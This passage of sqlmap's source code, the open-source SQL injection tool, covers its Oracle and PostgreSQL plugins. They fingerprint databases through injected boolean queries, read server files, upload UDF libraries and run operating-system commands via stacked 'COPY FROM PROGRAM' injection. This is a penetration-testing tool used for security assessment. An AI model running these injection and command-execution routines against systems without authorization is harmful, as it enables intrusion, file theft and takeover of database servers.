lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104) FROM foobar\"\n        True\n        >>> Syntax.escape(u\"SELECT 'abcd\\xebfgh' FROM foobar\") == \"SELECT CHR(97)||CHR(98)||CHR(99)||CHR(100)||NCHR(235)||CHR(102)||CHR(103)||CHR(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"||\".join(\"%s(%d)\" % (\"CHR\" if _ < 128 else \"NCHR\", _) for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/oracle/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import ORACLE_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.ORACLE)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.ORACLE\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(ORACLE_ALIASES):\n            setDbms(DBMS.ORACLE)\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.ORACLE\n        logger.info(infoMsg)\n\n        # NOTE: SELECT LENGTH(SYSDATE)=LENGTH(SYSDATE) FROM DUAL does\n        # not work connecting directly to the Oracle database\n        if conf.direct:\n            result = True\n        else:\n            result = inject.checkBooleanExpression(\"LENGTH(SYSDATE)=LENGTH(SYSDATE)\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.ORACLE\n            logger.info(infoMsg)\n\n            # NOTE: SELECT NVL(RAWTOHEX([RANDNUM1]),[RANDNUM1])=RAWTOHEX([RANDNUM1]) FROM DUAL does\n            # not work connecting directly to the Oracle database\n            if conf.direct:\n                result = True\n            else:\n                result = inject.checkBooleanExpression(\"NVL(RAWTOHEX([RANDNUM1]),[RANDNUM1])=RAWTOHEX([RANDNUM1])\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.ORACLE\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.ORACLE)\n\n            self.getBanner()\n\n            if not conf.extensiveFp:\n                return True\n\n            infoMsg = \"actively fingerprinting %s\" % DBMS.ORACLE\n            logger.info(infoMsg)\n\n            # Reference: https://en.wikipedia.org/wiki/Oracle_Database\n            for version in (\"23c\", \"21c\", \"19c\", \"18c\", \"12c\", \"11g\", \"10g\", \"9i\", \"8i\", \"7\"):\n                number = int(re.search(r\"([\\d]+)\", version).group(1))\n                output = inject.checkBooleanExpression(\"%d=(SELECT SUBSTR((VERSION),1,%d) FROM SYS.PRODUCT_COMPONENT_VERSION WHERE ROWNUM=1)\" % (number, 1 if number < 10 else 2))\n\n                if output:\n                    Backend.setVersion(version)\n                    break\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.ORACLE\n            logger.warning(warnMsg)\n\n            return False\n\n    def forceDbmsEnum(self):\n        if conf.db:\n            conf.db = conf.db.upper()\n\n        if conf.tbl:\n            conf.tbl = conf.tbl.upper()\n", "plugins/dbms/oracle/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"Operating system command execution functionality not \"\n        errMsg += \"yet implemented for Oracle\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"Operating system shell functionality not yet \"\n        errMsg += \"implemented for Oracle\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"Operating system out-of-band control functionality \"\n        errMsg += \"not yet implemented for Oracle\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"One click operating system out-of-band control \"\n        errMsg += \"functionality not yet implemented for Oracle\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/oracle/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.agent import agent\nfrom lib.core.common import dataToOutFile\nfrom lib.core.common import decodeDbmsHexValue\nfrom lib.core.common import getSQLSnippet\nfrom lib.core.common import isNoneValue\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import CHARSET_TYPE\nfrom lib.core.enums import DBMS\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom lib.request import inject\nfrom lib.request.connect import Connect as Request\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        localFilePaths = []\n        snippet = getSQLSnippet(DBMS.ORACLE, \"read_file_export_extension\")\n\n        for query in snippet.split(\"\\n\"):\n            query = query.strip()\n            query = agent.prefixQuery(\"OR (%s) IS NULL\" % query)\n            query = agent.suffixQuery(query, trimEmpty=False)\n            payload = agent.payload(newValue=query)\n            Request.queryPage(payload, content=False, raise404=False, silent=True, noteResponseTime=False)\n\n        for remoteFile in remoteFile.split(','):\n            if not kb.bruteMode:\n                infoMsg = \"fetching file: '%s'\" % remoteFile\n                logger.info(infoMsg)\n\n            kb.fileReadMode = True\n            fileContent = inject.getValue(\"SELECT RAWTOHEX(OSREADFILE('%s')) FROM DUAL\" % remoteFile, charsetType=CHARSET_TYPE.HEXADECIMAL)\n            kb.fileReadMode = False\n\n            if not isNoneValue(fileContent):\n                fileContent = decodeDbmsHexValue(fileContent, True)\n\n                if fileContent.strip():\n                    localFilePath = dataToOutFile(remoteFile, fileContent)\n                    localFilePaths.append(localFilePath)\n\n            elif not kb.bruteMode:\n                errMsg = \"no data retrieved\"\n                logger.error(errMsg)\n\n        return localFilePaths\n\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"File system write access not yet implemented for \"\n        errMsg += \"Oracle\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/oracle/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import ORACLE_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\nfrom plugins.dbms.oracle.enumeration import Enumeration\nfrom plugins.dbms.oracle.filesystem import Filesystem\nfrom plugins.dbms.oracle.fingerprint import Fingerprint\nfrom plugins.dbms.oracle.syntax import Syntax\nfrom plugins.dbms.oracle.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass OracleMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines Oracle methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = ORACLE_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.ORACLE] = Syntax.escape\n", "plugins/dbms/postgresql/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\n\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getHostname(self):\n        warnMsg = \"on PostgreSQL it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n", "plugins/dbms/postgresql/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import psycopg2\n    import psycopg2.extensions\n    psycopg2.extensions.register_type(psycopg2.extensions.UNICODE)\n    psycopg2.extensions.register_type(psycopg2.extensions.UNICODEARRAY)\nexcept:\n    pass\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: http://initd.org/psycopg/\n    User guide: http://initd.org/psycopg/docs/\n    API: http://initd.org/psycopg/docs/genindex.html\n    Debian package: python-psycopg2\n    License: GPL\n\n    Possible connectors: http://wiki.python.org/moin/PostgreSQL\n    \"\"\"\n\n    def connect(self):\n        self.initConnection()\n\n        try:\n            self.connector = psycopg2.connect(host=self.hostname, user=self.user, password=self.password, database=self.db, port=self.port)\n        except psycopg2.OperationalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.connector.set_client_encoding('UNICODE')\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except psycopg2.ProgrammingError as ex:\n            logger.warning(getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        retVal = False\n\n        try:\n            self.cursor.execute(query)\n            retVal = True\n        except (psycopg2.OperationalError, psycopg2.ProgrammingError) as ex:\n            logger.warning((\"(remote) '%s'\" % getSafeExString(ex)).strip())\n        except psycopg2.InternalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.connector.commit()\n\n        return retVal\n\n    def select(self, query):\n        retVal = None\n\n        if self.execute(query):\n            retVal = self.fetchall()\n\n        return retVal\n", "plugins/dbms/postgresql/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        Note: PostgreSQL has a general problem with concenation operator (||) precedence (hence the parentheses enclosing)\n              e.g. SELECT 1 WHERE 'a'!='a'||'b' will trigger error (\"argument of WHERE must be type boolean, not type text\")\n\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT (CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104)) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"(%s)\" % \"||\".join(\"CHR(%d)\" % _ for _ in getOrds(value))  # Postgres CHR() function already accepts Unicode code point of character(s)\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/postgresql/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.common import hashDBRetrieve\nfrom lib.core.common import hashDBWrite\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import FORK\nfrom lib.core.enums import HASHDB_KEYS\nfrom lib.core.enums import OS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import PGSQL_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.PGSQL)\n\n    def getFingerprint(self):\n        fork = hashDBRetrieve(HASHDB_KEYS.DBMS_FORK)\n\n        if fork is None:\n            if inject.checkBooleanExpression(\"VERSION() LIKE '%CockroachDB%'\"):\n                fork = FORK.COCKROACHDB\n            elif inject.checkBooleanExpression(\"VERSION() LIKE '%Redshift%'\"):      # Reference: https://dataedo.com/kb/query/amazon-redshift/check-server-version\n                fork = FORK.REDSHIFT\n            elif inject.checkBooleanExpression(\"VERSION() LIKE '%Greenplum%'\"):     # Reference: http://www.sqldbpros.com/wordpress/wp-content/uploads/2014/08/what-version-of-greenplum.png\n                fork = FORK.GREENPLUM\n            elif inject.checkBooleanExpression(\"VERSION() LIKE '%Yellowbrick%'\"):   # Reference: https://www.yellowbrick.com/docs/3.3/ybd_sqlref/version.html\n                fork = FORK.YELLOWBRICK\n            elif inject.checkBooleanExpression(\"VERSION() LIKE '%EnterpriseDB%'\"):  # Reference: https://www.enterprisedb.com/edb-docs/d/edb-postgres-advanced-server/user-guides/user-guide/11/EDB_Postgres_Advanced_Server_Guide.1.087.html\n                fork = FORK.ENTERPRISEDB\n            elif inject.checkBooleanExpression(\"VERSION() LIKE '%YB-%'\"):           # Reference: https://github.com/yugabyte/yugabyte-db/issues/2447#issue-499562926\n                fork = FORK.YUGABYTEDB\n            elif inject.checkBooleanExpression(\"VERSION() LIKE '%openGauss%'\"):\n                fork = FORK.OPENGAUSS\n            elif inject.checkBooleanExpression(\"AURORA_VERSION() LIKE '%'\"):        # Reference: https://aws.amazon.com/premiumsupport/knowledge-center/aurora-version-number/\n                fork = FORK.AURORA\n            else:\n                fork = \"\"\n\n            hashDBWrite(HASHDB_KEYS.DBMS_FORK, fork)\n\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.PGSQL\n            if fork:\n                value += \" (%s fork)\" % fork\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        if fork:\n            value += \"\\n%sfork fingerprint: %s\" % (blank, fork)\n\n        return value\n\n    def checkDbms(self):\n        \"\"\"\n        References for fingerprint:\n\n        * https://www.postgresql.org/docs/current/static/release.html\n        \"\"\"\n\n        if not conf.extensiveFp and Backend.isDbmsWithin(PGSQL_ALIASES):\n            setDbms(DBMS.PGSQL)\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.PGSQL\n        logger.info(infoMsg)\n\n        # NOTE: Vertica works too without the CONVERT_TO()\n        result = inject.checkBooleanExpression(\"CONVERT_TO('[RANDSTR]', QUOTE_IDENT(NULL)) IS NULL\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.PGSQL\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"COALESCE([RANDNUM], NULL)=[RANDNUM]\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.PGSQL\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.PGSQL)\n\n            self.getBanner()\n\n            if not conf.extensiveFp:\n                return True\n\n            infoMsg = \"actively fingerprinting %s\" % DBMS.PGSQL\n            logger.info(infoMsg)\n\n            if inject.checkBooleanExpression(\"RANDOM_NORMAL(0.0, 1.0) IS NOT NULL\"):\n                Backend.setVersion(\">= 16.0\")\n            elif inject.checkBooleanExpression(\"REGEXP_COUNT(NULL,NULL) IS NULL\"):\n                Backend.setVersion(\">= 15.0\")\n            elif inject.checkBooleanExpression(\"BIT_COUNT(NULL) IS NULL\"):\n                Backend.setVersion(\">= 14.0\")\n            elif inject.checkBooleanExpression(\"GEN_RANDOM_UUID() IS NOT NULL\"):\n                Backend.setVersion(\">= 13.0\")\n            elif inject.checkBooleanExpression(\"SINH(0)=0\"):\n                Backend.setVersion(\">= 12.0\")\n            elif inject.checkBooleanExpression(\"SHA256(NULL) IS NULL\"):\n                Backend.setVersion(\">= 11.0\")\n            elif inject.checkBooleanExpression(\"XMLTABLE(NULL) IS NULL\"):\n                Backend.setVersionList([\">= 10.0\", \"< 11.0\"])\n            elif inject.checkBooleanExpression(\"SIND(0)=0\"):\n                Backend.setVersionList([\">= 9.6.0\", \"< 10.0\"])\n            elif inject.checkBooleanExpression(\"TO_JSONB(1) IS NOT NULL\"):\n                Backend.setVersionList([\">= 9.5.0\", \"< 9.6.0\"])\n            elif inject.checkBooleanExpression(\"JSON_TYPEOF(NULL) IS NULL\"):\n                Backend.setVersionList([\">= 9.4.0\", \"< 9.5.0\"])\n            elif inject.checkBooleanExpression(\"ARRAY_REPLACE(NULL,1,1) IS NULL\"):\n                Backend.setVersionList([\">= 9.3.0\", \"< 9.4.0\"])\n            elif inject.checkBooleanExpression(\"ROW_TO_JSON(NULL) IS NULL\"):\n                Backend.setVersionList([\">= 9.2.0\", \"< 9.3.0\"])\n            elif inject.checkBooleanExpression(\"REVERSE('sqlmap')='pamlqs'\"):\n                Backend.setVersionList([\">= 9.1.0\", \"< 9.2.0\"])\n            elif inject.checkBooleanExpression(\"LENGTH(TO_CHAR(1,'EEEE'))>0\"):\n                Backend.setVersionList([\">= 9.0.0\", \"< 9.1.0\"])\n            elif inject.checkBooleanExpression(\"2=(SELECT DIV(6,3))\"):\n                Backend.setVersionList([\">= 8.4.0\", \"< 9.0.0\"])\n            elif inject.checkBooleanExpression(\"EXTRACT(ISODOW FROM CURRENT_TIMESTAMP)<8\"):\n                Backend.setVersionList([\">= 8.3.0\", \"< 8.4.0\"])\n            elif inject.checkBooleanExpression(\"ISFINITE(TRANSACTION_TIMESTAMP())\"):\n                Backend.setVersionList([\">= 8.2.0\", \"< 8.3.0\"])\n            elif inject.checkBooleanExpression(\"9=(SELECT GREATEST(5,9,1))\"):\n                Backend.setVersionList([\">= 8.1.0\", \"< 8.2.0\"])\n            elif inject.checkBooleanExpression(\"3=(SELECT WIDTH_BUCKET(5.35,0.024,10.06,5))\"):\n                Backend.setVersionList([\">= 8.0.0\", \"< 8.1.0\"])\n            elif inject.checkBooleanExpression(\"'d'=(SELECT SUBSTR(MD5('sqlmap'),1,1))\"):\n                Backend.setVersionList([\">= 7.4.0\", \"< 8.0.0\"])\n            elif inject.checkBooleanExpression(\"'p'=(SELECT SUBSTR(CURRENT_SCHEMA(),1,1))\"):\n                Backend.setVersionList([\">= 7.3.0\", \"< 7.4.0\"])\n            elif inject.checkBooleanExpression(\"8=(SELECT BIT_LENGTH(1))\"):\n                Backend.setVersionList([\">= 7.2.0\", \"< 7.3.0\"])\n            elif inject.checkBooleanExpression(\"'a'=(SELECT SUBSTR(QUOTE_LITERAL('a'),2,1))\"):\n                Backend.setVersionList([\">= 7.1.0\", \"< 7.2.0\"])\n            elif inject.checkBooleanExpression(\"8=(SELECT POW(2,3))\"):\n                Backend.setVersionList([\">= 7.0.0\", \"< 7.1.0\"])\n            elif inject.checkBooleanExpression(\"'a'=(SELECT MAX('a'))\"):\n                Backend.setVersionList([\">= 6.5.0\", \"< 6.5.3\"])\n            elif inject.checkBooleanExpression(\"VERSION()=VERSION()\"):\n                Backend.setVersionList([\">= 6.4.0\", \"< 6.5.0\"])\n            elif inject.checkBooleanExpression(\"2=(SELECT SUBSTR(CURRENT_DATE,1,1))\"):\n                Backend.setVersionList([\">= 6.3.0\", \"< 6.4.0\"])\n            elif inject.checkBooleanExpression(\"'s'=(SELECT SUBSTRING('sqlmap',1,1))\"):\n                Backend.setVersionList([\">= 6.2.0\", \"< 6.3.0\"])\n            else:\n                Backend.setVersion(\"< 6.2.0\")\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.PGSQL\n            logger.warning(warnMsg)\n\n            return False\n\n    def checkDbmsOs(self, detailed=False):\n        if Backend.getOs():\n            return\n\n        infoMsg = \"fingerprinting the back-end DBMS operating system\"\n        logger.info(infoMsg)\n\n        self.createSupportTbl(self.fileTblName, self.tblField, \"character(10000)\")\n        inject.goStacked(\"INSERT INTO %s(%s) VALUES (%s)\" % (self.fileTblName, self.tblField, \"VERSION()\"))\n\n        # Windows executables should always have ' Visual C++' or ' mingw'\n        # patterns within the banner\n        osWindows = (\" Visual C++\", \"mingw\")\n\n        for osPattern in osWindows:\n            query = \"(SELECT LENGTH(%s) FROM %s WHERE %s \" % (self.tblField, self.fileTblName, self.tblField)\n            query += \"LIKE '%\" + osPattern + \"%')>0\"\n\n            if inject.checkBooleanExpression(query):\n                Backend.setOs(OS.WINDOWS)\n\n                break\n\n        if Backend.getOs() is None:\n            Backend.setOs(OS.LINUX)\n\n        infoMsg = \"the back-end DBMS operating system is %s\" % Backend.getOs()\n        logger.info(infoMsg)\n\n        self.cleanup(onlyFileTbl=True)\n", "plugins/dbms/postgresql/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\n\nfrom lib.core.common import Backend\nfrom lib.core.common import checkFile\nfrom lib.core.common import decloakToTemp\nfrom lib.core.common import flattenValue\nfrom lib.core.common import filterNone\nfrom lib.core.common import isListLike\nfrom lib.core.common import isNoneValue\nfrom lib.core.common import isStackingAvailable\nfrom lib.core.common import randomStr\nfrom lib.core.compat import LooseVersion\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import paths\nfrom lib.core.enums import OS\nfrom lib.core.exception import SqlmapSystemException\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom lib.request import inject\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def udfSetRemotePath(self):\n        # On Windows\n        if Backend.isOs(OS.WINDOWS):\n            # The DLL can be in any folder where postgres user has\n            # read/write/execute access is valid\n            # NOTE: by not specifing any path, it will save into the\n            # data directory, on PostgreSQL 8.3 it is\n            # C:\\Program Files\\PostgreSQL\\8.3\\data.\n            self.udfRemoteFile = \"%s.%s\" % (self.udfSharedLibName, self.udfSharedLibExt)\n\n        # On Linux\n        else:\n            # The SO can be in any folder where postgres user has\n            # read/write/execute access is valid\n            self.udfRemoteFile = \"/tmp/%s.%s\" % (self.udfSharedLibName, self.udfSharedLibExt)\n\n    def udfSetLocalPaths(self):\n        self.udfLocalFile = paths.SQLMAP_UDF_PATH\n        self.udfSharedLibName = \"libs%s\" % randomStr(lowercase=True)\n\n        self.getVersionFromBanner()\n\n        banVer = kb.bannerFp[\"dbmsVersion\"]\n\n        if not banVer or not banVer[0].isdigit():\n            errMsg = \"unsupported feature on unknown version of PostgreSQL\"\n            raise SqlmapUnsupportedFeatureException(errMsg)\n        elif LooseVersion(banVer) >= LooseVersion(\"10\"):\n            majorVer = banVer.split('.')[0]\n        elif LooseVersion(banVer) >= LooseVersion(\"8.2\") and '.' in banVer:\n            majorVer = '.'.join(banVer.split('.')[:2])\n        else:\n            errMsg = \"unsupported feature on versions of PostgreSQL before 8.2\"\n            raise SqlmapUnsupportedFeatureException(errMsg)\n\n        try:\n            if Backend.isOs(OS.WINDOWS):\n                _ = os.path.join(self.udfLocalFile, \"postgresql\", \"windows\", \"%d\" % Backend.getArch(), majorVer, \"lib_postgresqludf_sys.dll_\")\n                checkFile(_)\n                self.udfLocalFile = decloakToTemp(_)\n                self.udfSharedLibExt = \"dll\"\n            else:\n                _ = os.path.join(self.udfLocalFile, \"postgresql\", \"linux\", \"%d\" % Backend.getArch(), majorVer, \"lib_postgresqludf_sys.so_\")\n                checkFile(_)\n                self.udfLocalFile = decloakToTemp(_)\n                self.udfSharedLibExt = \"so\"\n        except SqlmapSystemException:\n            errMsg = \"unsupported feature on PostgreSQL %s (%s-bit)\" % (majorVer, Backend.getArch())\n            raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def udfCreateFromSharedLib(self, udf, inpRet):\n        if udf in self.udfToCreate:\n            logger.info(\"creating UDF '%s' from the binary UDF file\" % udf)\n\n            inp = \", \".join(i for i in inpRet[\"input\"])\n            ret = inpRet[\"return\"]\n\n            # Reference: http://www.postgresql.org/docs/8.3/interactive/sql-createfunction.html\n            inject.goStacked(\"DROP FUNCTION %s(%s)\" % (udf, inp))\n            inject.goStacked(\"CREATE OR REPLACE FUNCTION %s(%s) RETURNS %s AS '%s', '%s' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE\" % (udf, inp, ret, self.udfRemoteFile, udf))\n\n            self.createdUdf.add(udf)\n        else:\n            logger.debug(\"keeping existing UDF '%s' as requested\" % udf)\n\n    def uncPathRequest(self):\n        self.createSupportTbl(self.fileTblName, self.tblField, \"text\")\n        inject.goStacked(\"COPY %s(%s) FROM '%s'\" % (self.fileTblName, self.tblField, self.uncPath), silent=True)\n        self.cleanup(onlyFileTbl=True)\n\n    def copyExecCmd(self, cmd):\n        output = None\n\n        if isStackingAvailable():\n            # Reference: https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5\n            self._forgedCmd = \"DROP TABLE IF EXISTS %s;\" % self.cmdTblName\n            self._forgedCmd += \"CREATE TABLE %s(%s text);\" % (self.cmdTblName, self.tblField)\n            self._forgedCmd += \"COPY %s FROM PROGRAM '%s';\" % (self.cmdTblName, cmd.replace(\"'\", \"''\"))\n            inject.goStacked(self._forgedCmd)\n\n            query = \"SELECT %s FROM %s\" % (self.tblField, self.cmdTblName)\n            output = inject.getValue(query, resumeValue=False)\n\n            if isListLike(output):\n                output = flattenValue(output)\n                output = filterNone(output)\n\n                if not isNoneValue(output):\n                    output = os.linesep.join(output)\n\n            self._cleanupCmd = \"DROP TABLE %s\" % self.cmdTblName\n            inject.goStacked(self._cleanupCmd)\n\n        return output\n\n    def checkCopyExec(self):\n        if kb.copyExecTest is None:\n            kb.copyExecTest = self.copyExecCmd(\"echo 1\") == '1'\n\n        return kb.copyExecTest\n", "plugins/dbms/postgresql/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\n\nfrom lib.core.common import randomInt\nfrom lib.core.compat import xrange\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom lib.core.settings import LOBLKSIZE\nfrom lib.request import inject\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def __init__(self):\n        self.oid = None\n        self.page = None\n\n        GenericFilesystem.__init__(self)\n\n    def stackedReadFile(self, remoteFile):\n        if not kb.bruteMode:\n            infoMsg = \"fetching file: '%s'\" % remoteFile\n            logger.info(infoMsg)\n\n        self.initEnv()\n\n        return self.udfEvalCmd(cmd=remoteFile, udfName=\"sys_fileread\")\n\n    def unionWriteFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"PostgreSQL does not support file upload with UNION \"\n        errMsg += \"query SQL injection technique\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):\n        localFileSize = os.path.getsize(localFile)\n        content = open(localFile, \"rb\").read()\n\n        self.oid = randomInt()\n        self.page = 0\n\n        self.createSupportTbl(self.fileTblName, self.tblField, \"text\")\n\n        debugMsg = \"create a new OID for a large object, it implicitly \"\n        debugMsg += \"adds an entry in the large objects system table\"\n        logger.debug(debugMsg)\n\n        # References:\n        # http://www.postgresql.org/docs/8.3/interactive/largeobjects.html\n        # http://www.postgresql.org/docs/8.3/interactive/lo-funcs.html\n\n        inject.goStacked(\"SELECT lo_unlink(%d)\" % self.oid)\n        inject.goStacked(\"SELECT lo_create(%d)\" % self.oid)\n        inject.goStacked(\"DELETE FROM pg_largeobject WHERE loid=%d\" % self.oid)\n\n        for offset in xrange(0, localFileSize, LOBLKSIZE):\n            fcEncodedList = self.fileContentEncode(content[offset:offset + LOBLKSIZE], \"base64\", False)\n            sqlQueries = 